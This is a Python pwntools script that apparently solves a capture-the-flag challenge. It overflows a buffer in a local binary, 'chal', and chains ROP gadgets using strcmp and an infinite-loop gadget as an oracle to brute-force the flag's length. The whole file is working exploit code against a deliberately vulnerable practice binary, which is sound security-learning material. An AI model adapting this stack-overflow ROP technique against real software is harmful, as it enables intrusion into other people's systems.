from pwn import *
import time
# p = remote('edu-ctf.zoolab.org', 10012)


context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

rbp = 0x411740

add_rax_rdx_ret = 0x00000000004106bf
ebfe = 0x0000000000403a8d
pop_rdi_ret = 0x0000000000401812
pop_rsi_ret = 0x0000000000402798
pop_rdx_ret = 0x000000000040171f
mov_byte_rdi_from_dl_ret = 0x0000000000442c53

strcmp_pop5reg_ret= 0x0000000000485307






#find flag size:
for offset in range(500):
    p = process('./chal', aslr=0)

    guessByte = 0x4de2e0 + 0x50#b'A'#0x4600
    flagAddress = 0x4de2e0+offset
    # flagAddress = 0x4de2e0+9


    ROP = flat(
        pop_rdi_ret, guessByte,
        pop_rdx_ret, p64(0x00),
        mov_byte_rdi_from_dl_ret, 
        pop_rsi_ret, flagAddress,
        strcmp_pop5reg_ret, 0xdeadbeef, 0xdeadbeef, 0xdeadbeef, 0xdeadbeef, 0xdeadbeef, ebfe
    )


    # gdb.attach(p,
    # """
    # b *main
    # """
    # )

    payload = b'a' * 0x20 + b'b' * 8 + ROP
    p.sendafter(b' rop\n', payload)
    time.sleep(1)
    try:
        p.send(b'a')
        break
    except Exception as e:
        print(e)
        pass

print('offset is ', offset)

